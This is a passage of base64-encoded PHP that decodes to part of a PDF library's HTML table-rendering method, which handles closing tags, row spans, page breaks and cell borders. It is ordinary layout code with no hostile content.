SBpbnQgJGtleSBjdXJyZW50IGVsZW1lbnQgaWQKCSAqIEBwYXJhbSBib29sZWFuICRjZWxsIGlmIHRydWUgYWRkIHRoZSBkZWZhdWx0IGxlZnQgKG9yIHJpZ2h0IGlmIFJUTCkgcGFkZGluZyB0byBlYWNoIG5ldyBsaW5lIChkZWZhdWx0IGZhbHNlKS4KCSAqIEBwYXJhbSBpbnQgJG1heGJvdHRvbWxpbmV5IG1heGltdW0geSB2YWx1ZSBvZiBjdXJyZW50IGxpbmUKCSAqIEByZXR1cm4gYXJyYXkgJGRvbQoJICogQHByb3RlY3RlZAoJICovCglwcm90ZWN0ZWQgZnVuY3Rpb24gY2xvc2VIVE1MVGFnSGFuZGxlcigkZG9tLCAka2V5LCAkY2VsbCwgJG1heGJvdHRvbWxpbmV5PTApIHsKCQkkdGFnID0gJGRvbVska2V5XTsKCQkkcGFyZW50ID0gJGRvbVsoJGRvbVska2V5XVsncGFyZW50J10pXTsKCQkkbGFzdHRhZyA9ICgoIWlzc2V0KCRkb21bKCRrZXkgKyAxKV0pKSBPUiAoKCFpc3NldCgkZG9tWygka2V5ICsgMildKSkgQU5EICgkZG9tWygka2V5ICsgMSldWyd2YWx1ZSddID09ICdtYXJrZXInKSkpOwoJCSRpbl90YWJsZV9oZWFkID0gZmFsc2U7CgkJLy8gbWF4aW11bSB4IHBvc2l0aW9uICh1c2VkIHRvIGRyYXcgYm9yZGVycykKCQlpZiAoJHRoaXMtPnJ0bCkgewoJCQkkeG1heCA9ICR0aGlzLT53OwoJCX0gZWxzZSB7CgkJCSR4bWF4ID0gMDsKCQl9CgkJaWYgKCR0YWdbJ2Jsb2NrJ10pIHsKCQkJJGhieiA9IDA7IC8vIGRpc3RhbmNlIGZyb20geSB0byBsaW5lIGJvdHRvbQoJCQkkaGIgPSAwOyAvLyB2ZXJ0aWNhbCBzcGFjZSBiZXR3ZWVuIGJsb2NrIHRhZ3MKCQkJLy8gY2FsY3VsYXRlIHZlcnRpY2FsIHNwYWNlIGZvciBibG9jayB0YWdzCgkJCWlmIChpc3NldCgkdGhpcy0+dGFndnNwYWNlc1skdGFnWyd2YWx1ZSddXVsxXVsnaCddKSAmJiAhZW1wdHkoJHRoaXMtPnRhZ3ZzcGFjZXNbJHRhZ1sndmFsdWUnXV1bMV1bJ2gnXSkgJiYgKCR0aGlzLT50YWd2c3BhY2VzWyR0YWdbJ3ZhbHVlJ11dWzFdWydoJ10gPj0gMCkpIHsKCQkJCSRwcmVfaCA9ICR0aGlzLT50YWd2c3BhY2VzWyR0YWdbJ3ZhbHVlJ11dWzFdWydoJ107CgkJCX0gZWxzZWlmIChpc3NldCgkcGFyZW50Wydmb250c2l6ZSddKSkgewoJCQkJJHByZV9oID0gJHRoaXMtPmdldENlbGxIZWlnaHQoJHBhcmVudFsnZm9udHNpemUnXSAvICR0aGlzLT5rKTsKCQkJfSBlbHNlIHsKCQkJCSRwcmVfaCA9ICR0aGlzLT5nZXRDZWxsSGVpZ2h0KCR0aGlzLT5Gb250U2l6ZSk7CgkJCX0KCQkJaWYgKGlzc2V0KCR0aGlzLT50YWd2c3BhY2VzWyR0YWdbJ3ZhbHVlJ11dWzFdWyduJ10pKSB7CgkJCQkkY24gPSAkdGhpcy0+dGFndnNwYWNlc1skdGFnWyd2YWx1ZSddXVsxXVsnbiddOwoJCQl9IGVsc2VpZiAocHJlZ19tYXRjaCgnL1toXVswLTldLycsICR0YWdbJ3ZhbHVlJ10pID4gMCkgewoJCQkJJGNuID0gMC42OwoJCQl9IGVsc2UgewoJCQkJJGNuID0gMTsKCQkJfQoJCQlpZiAoKCFpc3NldCgkdGhpcy0+dGFndnNwYWNlc1skdGFnWyd2YWx1ZSddXSkpIEFORCAoJHRhZ1sndmFsdWUnXSA9PSAnZGl2JykpIHsKCQkJCSRoYiA9IDA7CgkJCX0gZWxzZSB7CgkJCQkkaGIgPSAoJGNuICogJHByZV9oKTsKCQkJfQoJCQlpZiAoJG1heGJvdHRvbWxpbmV5ID4gJHRoaXMtPlBhZ2VCcmVha1RyaWdnZXIpIHsKCQkJCSRoYnogPSAkdGhpcy0+Z2V0Q2VsbEhlaWdodCgkdGhpcy0+Rm9udFNpemUpOwoJCQl9IGVsc2VpZiAoJHRoaXMtPnkgPCAkbWF4Ym90dG9tbGluZXkpIHsKCQkJCSRoYnogPSAoJG1heGJvdHRvbWxpbmV5IC0gJHRoaXMtPnkpOwoJCQl9CgkJfQoJCS8vIENsb3NpbmcgdGFnCgkJc3dpdGNoKCR0YWdbJ3ZhbHVlJ10pIHsKCQkJY2FzZSAndHInOiB7CgkJCQkkdGFibGVfZWwgPSAkZG9tWygkZG9tWyRrZXldWydwYXJlbnQnXSldWydwYXJlbnQnXTsKCQkJCWlmICghaXNzZXQoJHBhcmVudFsnZW5keSddKSkgewoJCQkJCSRkb21bKCRkb21bJGtleV1bJ3BhcmVudCddKV1bJ2VuZHknXSA9ICR0aGlzLT55OwoJCQkJCSRwYXJlbnRbJ2VuZHknXSA9ICR0aGlzLT55OwoJCQkJfQoJCQkJaWYgKCFpc3NldCgkcGFyZW50WydlbmRwYWdlJ10pKSB7CgkJCQkJJGRvbVsoJGRvbVska2V5XVsncGFyZW50J10pXVsnZW5kcGFnZSddID0gJHRoaXMtPnBhZ2U7CgkJCQkJJHBhcmVudFsnZW5kcGFnZSddID0gJHRoaXMtPnBhZ2U7CgkJCQl9CgkJCQlpZiAoIWlzc2V0KCRwYXJlbnRbJ2VuZGNvbHVtbiddKSkgewoJCQkJCSRkb21bKCRkb21bJGtleV1bJ3BhcmVudCddKV1bJ2VuZGNvbHVtbiddID0gJHRoaXMtPmN1cnJlbnRfY29sdW1uOwoJCQkJCSRwYXJlbnRbJ2VuZGNvbHVtbiddID0gJHRoaXMtPmN1cnJlbnRfY29sdW1uOwoJCQkJfQoJCQkJLy8gdXBkYXRlIHJvdy1zcGFubmVkIGNlbGxzCgkJCQlpZiAoaXNzZXQoJGRvbVskdGFibGVfZWxdWydyb3dzcGFucyddKSkgewoJCQkJCWZvcmVhY2ggKCRkb21bJHRhYmxlX2VsXVsncm93c3BhbnMnXSBhcyAkayA9PiAkdHJ3c3ApIHsKCQkJCQkJJGRvbVskdGFibGVfZWxdWydyb3dzcGFucyddWyRrXVsncm93c3BhbiddIC09IDE7CgkJCQkJCWlmICgkZG9tWyR0YWJsZV9lbF1bJ3Jvd3NwYW5zJ11bJGtdWydyb3dzcGFuJ10gPT0gMCkgewoJCQkJCQkJaWYgKCgkZG9tWyR0YWJsZV9lbF1bJ3Jvd3NwYW5zJ11bJGtdWydlbmRwYWdlJ10gPT0gJHBhcmVudFsnZW5kcGFnZSddKSBBTkQgKCRkb21bJHRhYmxlX2VsXVsncm93c3BhbnMnXVska11bJ2VuZGNvbHVtbiddID09ICRwYXJlbnRbJ2VuZGNvbHVtbiddKSkgewoJCQkJCQkJCSRkb21bKCRkb21bJGtleV1bJ3BhcmVudCddKV1bJ2VuZHknXSA9IG1heCgkZG9tWyR0YWJsZV9lbF1bJ3Jvd3NwYW5zJ11bJGtdWydlbmR5J10sICRwYXJlbnRbJ2VuZHknXSk7CgkJCQkJCQl9IGVsc2VpZiAoKCRkb21bJHRhYmxlX2VsXVsncm93c3BhbnMnXVska11bJ2VuZHBhZ2UnXSA+ICRwYXJlbnRbJ2VuZHBhZ2UnXSkgT1IgKCRkb21bJHRhYmxlX2VsXVsncm93c3BhbnMnXVska11bJ2VuZGNvbHVtbiddID4gJHBhcmVudFsnZW5kY29sdW1uJ10pKSB7CgkJCQkJCQkJJGRvbVsoJGRvbVska2V5XVsncGFyZW50J10pXVsnZW5keSddID0gJGRvbVskdGFibGVfZWxdWydyb3dzcGFucyddWyRrXVsnZW5keSddOwoJCQkJCQkJCSRkb21bKCRkb21bJGtleV1bJ3BhcmVudCddKV1bJ2VuZHBhZ2UnXSA9ICRkb21bJHRhYmxlX2VsXVsncm93c3BhbnMnXVska11bJ2VuZHBhZ2UnXTsKCQkJCQkJCQkkZG9tWygkZG9tWyRrZXldWydwYXJlbnQnXSldWydlbmRjb2x1bW4nXSA9ICRkb21bJHRhYmxlX2VsXVsncm93c3BhbnMnXVska11bJ2VuZGNvbHVtbiddOwoJCQkJCQkJfQoJCQkJCQl9CgkJCQkJfQoJCQkJCS8vIHJlcG9ydCBuZXcgZW5keSBhbmQgZW5kcGFnZSB0byB0aGUgcm93c3Bhbm5lZCBjZWxscwoJCQkJCWZvcmVhY2ggKCRkb21bJHRhYmxlX2VsXVsncm93c3BhbnMnXSBhcyAkayA9PiAkdHJ3c3ApIHsKCQkJCQkJaWYgKCRkb21bJHRhYmxlX2VsXVsncm93c3BhbnMnXVska11bJ3Jvd3NwYW4nXSA9PSAwKSB7CgkJCQkJCQkkZG9tWyR0YWJsZV9lbF1bJ3Jvd3NwYW5zJ11bJGtdWydlbmRwYWdlJ10gPSBtYXgoJGRvbVskdGFibGVfZWxdWydyb3dzcGFucyddWyRrXVsnZW5kcGFnZSddLCAkZG9tWygkZG9tWyRrZXldWydwYXJlbnQnXSldWydlbmRwYWdlJ10pOwoJCQkJCQkJJGRvbVsoJGRvbVska2V5XVsncGFyZW50J10pXVsnZW5kcGFnZSddID0gJGRvbVskdGFibGVfZWxdWydyb3dzcGFucyddWyRrXVsnZW5kcGFnZSddOwoJCQkJCQkJJGRvbVskdGFibGVfZWxdWydyb3dzcGFucyddWyRrXVsnZW5kY29sdW1uJ10gPSBtYXgoJGRvbVskdGFibGVfZWxdWydyb3dzcGFucyddWyRrXVsnZW5kY29sdW1uJ10sICRkb21bKCRkb21bJGtleV1bJ3BhcmVudCddKV1bJ2VuZGNvbHVtbiddKTsKCQkJCQkJCSRkb21bKCRkb21bJGtleV1bJ3BhcmVudCddKV1bJ2VuZGNvbHVtbiddID0gJGRvbVskdGFibGVfZWxdWydyb3dzcGFucyddWyRrXVsnZW5kY29sdW1uJ107CgkJCQkJCQkkZG9tWyR0YWJsZV9lbF1bJ3Jvd3NwYW5zJ11bJGtdWydlbmR5J10gPSBtYXgoJGRvbVskdGFibGVfZWxdWydyb3dzcGFucyddWyRrXVsnZW5keSddLCAkZG9tWygkZG9tWyRrZXldWydwYXJlbnQnXSldWydlbmR5J10pOwoJCQkJCQkJJGRvbVsoJGRvbVska2V5XVsncGFyZW50J10pXVsnZW5keSddID0gJGRvbVskdGFibGVfZWxdWydyb3dzcGFucyddWyRrXVsnZW5keSddOwoJCQkJCQl9CgkJCQkJfQoJCQkJCS8vIHVwZGF0ZSByZW1haW5pbmcgcm93c3Bhbm5lZCBjZWxscwoJCQkJCWZvcmVhY2ggKCRkb21bJHRhYmxlX2VsXVsncm93c3BhbnMnXSBhcyAkayA9PiAkdHJ3c3ApIHsKCQkJCQkJaWYgKCRkb21bJHRhYmxlX2VsXVsncm93c3BhbnMnXVska11bJ3Jvd3NwYW4nXSA9PSAwKSB7CgkJCQkJCQkkZG9tWyR0YWJsZV9lbF1bJ3Jvd3NwYW5zJ11bJGtdWydlbmRwYWdlJ10gPSAkZG9tWygkZG9tWyRrZXldWydwYXJlbnQnXSldWydlbmRwYWdlJ107CgkJCQkJCQkkZG9tWyR0YWJsZV9lbF1bJ3Jvd3NwYW5zJ11bJGtdWydlbmRjb2x1bW4nXSA9ICRkb21bKCRkb21bJGtleV1bJ3BhcmVudCddKV1bJ2VuZGNvbHVtbiddOwoJCQkJCQkJJGRvbVskdGFibGVfZWxdWydyb3dzcGFucyddWyRrXVsnZW5keSddID0gJGRvbVsoJGRvbVska2V5XVsncGFyZW50J10pXVsnZW5keSddOwoJCQkJCQl9CgkJCQkJfQoJCQkJfQoJCQkJJHByZXZfcGFnZSA9ICR0aGlzLT5wYWdlOwoJCQkJJHRoaXMtPnNldFBhZ2UoJGRvbVsoJGRvbVska2V5XVsncGFyZW50J10pXVsnZW5kcGFnZSddKTsKCQkJCWlmICgkdGhpcy0+bnVtX2NvbHVtbnMgPiAxKSB7CgkJCQkJaWYgKCgkcHJldl9wYWdlIDwgJHRoaXMtPnBhZ2UpCgkJCQkJCUFORCAoKCgkdGhpcy0+Y3VycmVudF9jb2x1bW4gPT0gMCkgQU5EICgkZG9tWygkZG9tWyRrZXldWydwYXJlbnQnXSldWydlbmRjb2x1bW4nXSA9PSAoJHRoaXMtPm51bV9jb2x1bW5zIC0gMSkpKQoJCQkJCQkJT1IgKCR0aGlzLT5jdXJyZW50X2NvbHVtbiA9PSAkZG9tWygkZG9tWyRrZXldWydwYXJlbnQnXSldWydlbmRjb2x1bW4nXSkpKSB7CgkJCQkJCS8vIHBhZ2UganVtcAoJCQkJCQkkdGhpcy0+c2VsZWN0Q29sdW1uKDApOwoJCQkJCQkkZG9tWygkZG9tWyRrZXldWydwYXJlbnQnXSldWydlbmRjb2x1bW4nXSA9IDA7CgkJCQkJCSRkb21bKCRkb21bJGtleV1bJ3BhcmVudCddKV1bJ2VuZHknXSA9ICR0aGlzLT55OwoJCQkJCX0gZWxzZSB7CgkJCQkJCSR0aGlzLT5zZWxlY3RDb2x1bW4oJGRvbVsoJGRvbVska2V5XVsncGFyZW50J10pXVsnZW5kY29sdW1uJ10pOwoJCQkJCQkkdGhpcy0+eSA9ICRkb21bKCRkb21bJGtleV1bJ3BhcmVudCddKV1bJ2VuZHknXTsKCQkJCQl9CgkJCQl9IGVsc2UgewoJCQkJCSR0aGlzLT55ID0gJGRvbVsoJGRvbVska2V5XVsncGFyZW50J10pXVsnZW5keSddOwoJCQkJfQoJCQkJaWYgKGlzc2V0KCRkb21bJHRhYmxlX2VsXVsnYXR0cmlidXRlJ11bJ2NlbGxzcGFjaW5nJ10pKSB7CgkJCQkJJHRoaXMtPnkgKz0gJHRoaXMtPmdldEhUTUxVbml0VG9Vbml0cygkZG9tWyR0YWJsZV9lbF1bJ2F0dHJpYnV0ZSddWydjZWxsc3BhY2luZyddLCAxLCAncHgnKTsKCQkJCX0gZWxzZWlmIChpc3NldCgkZG9tWyR0YWJsZV9lbF1bJ2JvcmRlci1zcGFjaW5nJ10pKSB7CgkJCQkJJHRoaXMtPnkgKz0gJGRvbVskdGFibGVfZWxdWydib3JkZXItc3BhY2luZyddWydWJ107CgkJCQl9CgkJCQkkdGhpcy0+TG4oMCwgJGNlbGwpOwoJCQkJaWYgKCR0aGlzLT5jdXJyZW50X2NvbHVtbiA9PSAkcGFyZW50WydzdGFydGNvbHVtbiddKSB7CgkJCQkJJHRoaXMtPnggPSAkcGFyZW50WydzdGFydHgnXTsKCQkJCX0KCQkJCS8vIGFjY291bnQgZm9yIGJvb2tsZXQgbW9kZQoJCQkJaWYgKCR0aGlzLT5wYWdlID4gJHBhcmVudFsnc3RhcnRwYWdlJ10pIHsKCQkJCQlpZiAoKCR0aGlzLT5ydGwpIEFORCAoJHRoaXMtPnBhZ2VkaW1bJHRoaXMtPnBhZ2VdWydvcm0nXSAhPSAkdGhpcy0+cGFnZWRpbVskcGFyZW50WydzdGFydHBhZ2UnXV1bJ29ybSddKSkgewoJCQkJCQkkdGhpcy0+eCAtPSAoJHRoaXMtPnBhZ2VkaW1bJHRoaXMtPnBhZ2VdWydvcm0nXSAtICR0aGlzLT5wYWdlZGltWyRwYXJlbnRbJ3N0YXJ0cGFnZSddXVsnb3JtJ10pOwoJCQkJCX0gZWxzZWlmICgoISR0aGlzLT5ydGwpIEFORCAoJHRoaXMtPnBhZ2VkaW1bJHRoaXMtPnBhZ2VdWydvbG0nXSAhPSAkdGhpcy0+cGFnZWRpbVskcGFyZW50WydzdGFydHBhZ2UnXV1bJ29sbSddKSkgewoJCQkJCQkkdGhpcy0+eCArPSAoJHRoaXMtPnBhZ2VkaW1bJHRoaXMtPnBhZ2VdWydvbG0nXSAtICR0aGlzLT5wYWdlZGltWyRwYXJlbnRbJ3N0YXJ0cGFnZSddXVsnb2xtJ10pOwoJCQkJCX0KCQkJCX0KCQkJCWJyZWFrOwoJCQl9CgkJCWNhc2UgJ3RhYmxlaGVhZCc6CgkJCQkvLyBjbG9zaW5nIHRhZyB1c2VkIGZvciB0aGUgdGhlYWQgcGFydAoJCQkJJGluX3RhYmxlX2hlYWQgPSB0cnVlOwoJCQkJJHRoaXMtPmludGhlYWQgPSBmYWxzZTsKCQkJY2FzZSAndGFibGUnOiB7CgkJCQkkdGFibGVfZWwgPSAkcGFyZW50OwoJCQkJLy8gc2V0IGRlZmF1bHQgYm9yZGVyCgkJCQlpZiAoaXNzZXQoJHRhYmxlX2VsWydhdHRyaWJ1dGUnXVsnYm9yZGVyJ10pIEFORCAoJHRhYmxlX2VsWydhdHRyaWJ1dGUnXVsnYm9yZGVyJ10gPiAwKSkgewoJCQkJCS8vIHNldCBkZWZhdWx0IGJvcmRlcgoJCQkJCSRib3JkZXIgPSBhcnJheSgnTFRSQicgPT4gYXJyYXkoJ3dpZHRoJyA9PiAkdGhpcy0+Z2V0Q1NTQm9yZGVyV2lkdGgoJHRhYmxlX2VsWydhdHRyaWJ1dGUnXVsnYm9yZGVyJ10pLCAnY2FwJz0+J3NxdWFyZScsICdqb2luJz0+J21pdGVyJywgJ2Rhc2gnPT4gMCwgJ2NvbG9yJz0+YXJyYXkoMCwwLDApKSk7CgkJCQl9IGVsc2UgewoJCQkJCSRib3JkZXIgPSAwOwoJCQkJfQoJCQkJJGRlZmF1bHRfYm9yZGVyID0gJGJvcmRlcjsKCQkJCS8vIGZpeCBib3R0b20gbGluZSBhbGlnbm1lbnQgb2YgbGFzdCBsaW5lIGJlZm9yZSBwYWdlIGJyZWFrCgkJCQlmb3JlYWNoICgkZG9tWygkZG9tWyRrZXldWydwYXJlbnQnXSldWyd0cmlkcyddIGFzICRqID0+ICR0cmtleSkgewoJCQkJCS8vIHVwZGF0ZSByb3ctc3Bhbm5lZCBjZWxscwoJCQkJCWlmIChpc3NldCgkZG9tWygkZG9tWyRrZXldWydwYXJlbnQnXSldWydyb3dzcGFucyddKSkgewoJCQkJCQlmb3JlYWNoICgkZG9tWygkZG9tWyRrZXldWydwYXJlbnQnXSldWydyb3dzcGFucyddIGFzICRrID0+ICR0cndzcCkgewoJCQkJCQkJaWYgKGlzc2V0KCRwcmV2dHJrZXkpIEFORCAoJHRyd3NwWyd0cmlkJ10gPT0gJHByZXZ0cmtleSkgQU5EICgkdHJ3c3BbJ21yb3dzcGFuJ10gPiAwKSkgewoJCQkJCQkJCSRkb21bKCRkb21bJGtleV1bJ3BhcmVudCddKV1bJ3Jvd3NwYW5zJ11bJGtdWyd0cmlkJ10gPSAkdHJrZXk7CgkJCQkJCQl9CgkJCQkJCQlpZiAoJGRvbVsoJGRvbVska2V5XVsncGFyZW50J10pXVsncm93c3BhbnMnXVska11bJ3RyaWQnXSA9PSAkdHJrZXkpIHsKCQkJCQkJCQkkZG9tWygkZG9tWyRrZXldWydwYXJlbnQnXSldWydyb3dzcGFucyddWyRrXVsnbXJvd3NwYW4nXSAtPSAxOwoJCQkJCQkJfQoJCQkJCQl9CgkJCQkJfQoJCQkJCWlmIChpc3NldCgkcHJldnRya2V5KSBBTkQgKCRkb21bJHRya2V5XVsnc3RhcnRwYWdlJ10gPiAkZG9tWyRwcmV2dHJrZXldWydlbmRwYWdlJ10pKSB7CgkJCQkJCSRwZ2VuZHkgPSAkdGhpcy0+cGFnZWRpbVskZG9tWyRwcmV2dHJrZXldWydlbmRwYWdlJ11dWydoayddIC0gJHRoaXMtPnBhZ2VkaW1bJGRvbVskcHJldnRya2V5XVsnZW5kcGFnZSddXVsnYm0nXTsKCQkJCQkJJGRvbVskcHJldnRya2V5XVsnZW5keSddID0gJHBnZW5keTsKCQkJCQkJLy8gdXBkYXRlIHJvdy1zcGFubmVkIGNlbGxzCgkJCQkJCWlmIChpc3NldCgkZG9tWygkZG9tWyRrZXldWydwYXJlbnQnXSldWydyb3dzcGFucyddKSkgewoJCQkJCQkJZm9yZWFjaCAoJGRvbVsoJGRvbVska2V5XVsncGFyZW50J10pXVsncm93c3BhbnMnXSBhcyAkayA9PiAkdHJ3c3ApIHsKCQkJCQkJCQlpZiAoKCR0cndzcFsndHJpZCddID09ICRwcmV2dHJrZXkpIEFORCAoJHRyd3NwWydtcm93c3BhbiddID49IDApIEFORCAoJHRyd3NwWydlbmRwYWdlJ10gPT0gJGRvbVskcHJldnRya2V5XVsnZW5kcGFnZSddKSkgewoJCQkJCQkJCQkkZG9tWygkZG9tWyRrZXldWydwYXJlbnQnXSldWydyb3dzcGFucyddWyRrXVsnZW5keSddID0gJHBnZW5keTsKCQkJCQkJCQkJJGRvbVsoJGRvbVska2V5XVsncGFyZW50J10pXVsncm93c3BhbnMnXVska11bJ21yb3dzcGFuJ10gPSAtMTsKCQkJCQkJCQl9CgkJCQkJCQl9CgkJCQkJCX0KCQkJCQl9CgkJCQkJJHByZXZ0cmtleSA9ICR0cmtleTsKCQkJCQkkdGFibGVfZWwgPSAkZG9tWygkZG9tWyRrZXldWydwYXJlbnQnXSldOwoJCQkJfQoJCQkJLy8gZm9yIGVhY2ggcm93CgkJCQlpZiAoIWVtcHR5KCR0YWJsZV9lbFsndHJpZHMnXSkpIHsKCQkJCQl1bnNldCgkeG1heCk7CgkJCQl9CgkJCQlmb3JlYWNoICgkdGFibGVfZWxbJ3RyaWRzJ10gYXMgJGogPT4gJHRya2V5KSB7CgkJCQkJJHBhcmVudCA9ICRkb21bJHRya2V5XTsKCQkJCQlpZiAoIWlzc2V0KCR4bWF4KSkgewoJCQkJCQkkeG1heCA9ICRwYXJlbnRbJ2NlbGxwb3MnXVsoY291bnQoJHBhcmVudFsnY2VsbHBvcyddKSAtIDEpXVsnZW5keCddOwoJCQkJCX0KCQkJCQkvLyBmb3IgZWFjaCBjZWxsIG9uIHRoZSByb3cKCQkJCQlmb3JlYWNoICgkcGFyZW50WydjZWxscG9zJ10gYXMgJGsgPT4gJGNlbGxwb3MpIHsKCQkJCQkJaWYgKGlzc2V0KCRjZWxscG9zWydyb3dzcGFuaWQnXSkgQU5EICgkY2VsbHBvc1sncm93c3BhbmlkJ10gPj0gMCkpIHsKCQkJCQkJCSRjZWxscG9zWydzdGFydHgnXSA9ICR0YWJsZV9lbFsncm93c3BhbnMnXVsoJGNlbGxwb3NbJ3Jvd3NwYW5pZCddKV1bJ3N0YXJ0eCddOwoJCQkJCQkJJGNlbGxwb3NbJ2VuZHgnXSA9ICR0YWJsZV9lbFsncm93c3BhbnMnXVsoJGNlbGxwb3NbJ3Jvd3NwYW5pZCddKV1bJ2VuZHgnXTsKCQkJCQkJCSRlbmR5ID0gJHRhYmxlX2VsWydyb3dzcGFucyddWygkY2VsbHBvc1sncm93c3BhbmlkJ10pXVsnZW5keSddOwoJCQkJCQkJJHN0YXJ0cGFnZSA9ICR0YWJsZV9lbFsncm93c3BhbnMnXVsoJGNlbGxwb3NbJ3Jvd3NwYW5pZCddKV1bJ3N0YXJ0cGFnZSddOwoJCQkJCQkJJGVuZHBhZ2UgPSAkdGFibGVfZWxbJ3Jvd3NwYW5zJ11bKCRjZWxscG9zWydyb3dzcGFuaWQnXSldWydlbmRwYWdlJ107CgkJCQkJCQkkc3RhcnRjb2x1bW4gPSAkdGFibGVfZWxbJ3Jvd3NwYW5zJ11bKCRjZWxscG9zWydyb3dzcGFuaWQnXSldWydzdGFydGNvbHVtbiddOwoJCQkJCQkJJGVuZGNvbHVtbiA9ICR0YWJsZV9lbFsncm93c3BhbnMnXVsoJGNlbGxwb3NbJ3Jvd3NwYW5pZCddKV1bJ2VuZGNvbHVtbiddOwoJCQkJCQl9IGVsc2UgewoJCQkJCQkJJGVuZHkgPSAkcGFyZW50WydlbmR5J107CgkJCQkJCQkkc3RhcnRwYWdlID0gJHBhcmVudFsnc3RhcnRwYWdlJ107CgkJCQkJCQkkZW5kcGFnZSA9ICRwYXJlbnRbJ2VuZHBhZ2UnXTsKCQkJCQkJCSRzdGFydGNvbHVtbiA9ICRwYXJlbnRbJ3N0YXJ0Y29sdW1uJ107CgkJCQkJCQkkZW5kY29sdW1uID0gJHBhcmVudFsnZW5kY29sdW1uJ107CgkJCQkJCX0KCQkJCQkJaWYgKCR0aGlzLT5udW1fY29sdW1ucyA9PSAwKSB7CgkJCQkJCQkkdGhpcy0+bnVtX2NvbHVtbnMgPSAxOwoJCQkJCQl9CgkJCQkJCWlmIChpc3NldCgkY2VsbHBvc1snYm9yZGVyJ10pKSB7CgkJCQkJCQkkYm9yZGVyID0gJGNlbGxwb3NbJ2JvcmRlciddOwoJCQkJCQl9CgkJCQkJCWlmIChpc3NldCgkY2VsbHBvc1snYmdjb2xvciddKSBBTkQgKCRjZWxscG9zWydiZ2NvbG9yJ10pICE9PSBmYWxzZSkgewoJCQkJCQkJJHRoaXMtPnNldEZpbGxDb2xvckFycmF5KCRjZWxscG9zWydiZ2NvbG9yJ10pOwoJCQkJCQkJJGZpbGwgPSB0cnVlOwoJCQkJCQl9IGVsc2UgewoJCQkJCQkJJGZpbGwgPSBmYWxzZTsKCQkJCQkJfQoJCQkJCQkkeCA9ICRjZWxscG9zWydzdGFydHgnXTsKCQkJCQkJJHkgPSAkcGFyZW50WydzdGFydHknXTsKCQkJCQkJJHN0YXJ0eSA9ICR5OwoJCQkJCQkkdyA9IGFicygkY2VsbHBvc1snZW5keCddIC0gJGNlbGxwb3NbJ3N0YXJ0eCddKTsKCQkJCQkJLy8gZ2V0IGJvcmRlciBtb2RlcwoJCQkJCQkkYm9yZGVyX3N0YXJ0ID0gVENQREZfU1RBVElDOjpnZXRCb3JkZXJNb2RlKCRib3JkZXIsICRwb3NpdGlvbj0nc3RhcnQnLCAkdGhpcy0+b3BlbmNlbGwpOwoJCQkJCQkkYm9yZGVyX2VuZCA9IFRDUERGX1NUQVRJQzo6Z2V0Qm9yZGVyTW9kZSgkYm9yZGVyLCAkcG9zaXRpb249J2VuZCcsICR0aGlzLT5vcGVuY2VsbCk7CgkJCQkJCSRib3JkZXJfbWlkZGxlID0gVENQREZfU1RBVElDOjpnZXRCb3JkZXJNb2RlKCRib3JkZXIsICRwb3NpdGlvbj0nbWlkZGxlJywgJHRoaXMtPm9wZW5jZWxsKTsKCQkJCQkJLy8gZGVzaWduIGJvcmRlcnMgYXJvdW5kIEhUTUwgY2VsbHMuCgkJCQkJCWZvciAoJHBhZ2UgPSAkc3RhcnRwYWdlOyAkcGFnZSA8PSAkZW5kcGFnZTsgKyskcGFnZSkgeyAvLyBmb3IgZWFjaCBwYWdlCgkJCQkJCQkkY2NvZGUgPSAnJzsKCQkJCQkJCSR0aGlzLT5zZXRQYWdlKCRwYWdlKTsKCQkJCQkJCWlmICgkdGhpcy0+bnVtX2NvbHVtbnMgPCAyKSB7CgkJCQkJCQkJLy8gc2luZ2xlLWNvbHVtbiBtb2RlCgkJCQkJCQkJJHRoaXMtPnggPSAkeDsKCQkJCQkJCQkkdGhpcy0+eSA9ICR0aGlzLT50TWFyZ2luOwoJCQkJCQkJfQoJCQkJCQkJLy8gYWNjb3VudCBmb3IgbWFyZ2luIGNoYW5nZXMKCQkJCQkJCWlmICgkcGFnZSA+ICRzdGFydHBhZ2UpIHsKCQkJCQkJCQlpZiAoKCR0aGlzLT5ydGwpIEFORCAoJHRoaXMtPnBhZ2VkaW1bJHBhZ2VdWydvcm0nXSAhPSAkdGhpcy0+cGFnZWRpbVskc3RhcnRwYWdlXVsnb3JtJ10pKSB7CgkJCQkJCQkJCSR0aGlzLT54IC09ICgkdGhpcy0+cGFnZWRpbVskcGFnZV1bJ29ybSddIC0gJHRoaXMtPnBhZ2VkaW1bJHN0YXJ0cGFnZV1bJ29ybSddKTsKCQkJCQkJCQl9IGVsc2VpZiAoKCEkdGhpcy0+cnRsKSBBTkQgKCR0aGlzLT5wYWdlZGltWyRwYWdlXVsnb2xtJ10gIT0gJHRoaXMtPnBhZ2VkaW1bJHN0YXJ0cGFnZV1bJ29sbSddKSkgewoJCQkJCQkJCQkkdGhpcy0+eCArPSAoJHRoaXMtPnBhZ2VkaW1bJHBhZ2VdWydvbG0nXSAtICR0aGlzLT5wYWdlZGltWyRzdGFydHBhZ2VdWydvbG0nXSk7CgkJCQkJCQkJfQoJCQkJCQkJfQoJCQkJCQkJaWYgKCRzdGFydHBhZ2UgPT0gJGVuZHBhZ2UpIHsgLy8gc2luZ2xlIHBhZ2UKCQkJCQkJCQkkZGVsdGFjb2wgPSAwOwoJCQkJCQkJCSRkZWx0YXRoID0gMDsKCQkJCQkJCQlmb3IgKCRjb2x1bW4gPSAkc3RhcnRjb2x1bW47ICRjb2x1bW4gPD0gJGVuZGNvbHVtbjsgKyskY29sdW1uKSB7IC8vIGZvciBlYWNoIGNvbHVtbgoJCQkJCQkJCQkkdGhpcy0+c2VsZWN0Q29sdW1uKCRjb2x1bW4pOwoJCQkJCQkJCQlpZiAoJHN0YXJ0Y29sdW1uID09ICRlbmRjb2x1bW4pIHsgLy8gc2luZ2xlIGNvbHVtbgoJCQkJCQkJCQkJJGNib3JkZXIgPSAkYm9yZGVyOwoJCQkJCQkJCQkJJGggPSAkZW5keSAtICRwYXJlbnRbJ3N0YXJ0eSddOwoJCQkJCQkJCQkJJHRoaXMtPnkgPSAkeTsKCQkJCQkJCQkJCSR0aGlzLT54ID0gJHg7CgkJCQkJCQkJCX0gZWxzZWlmICgkY29sdW1uID09ICRzdGFydGNvbHVtbikgeyAvLyBmaXJzdCBjb2x1bW4KCQkJCQkJCQkJCSRjYm9yZGVyID0gJGJvcmRlcl9zdGFydDsKCQkJCQkJCQkJCSR0aGlzLT55ID0gJHN0YXJ0eTsKCQkJCQkJCQkJCSR0aGlzLT54ID0gJHg7CgkJCQkJCQkJCQkkaCA9ICR0aGlzLT5oIC0gJHRoaXMtPnkgLSAkdGhpcy0+Yk1hcmdpbjsKCQkJCQkJCQ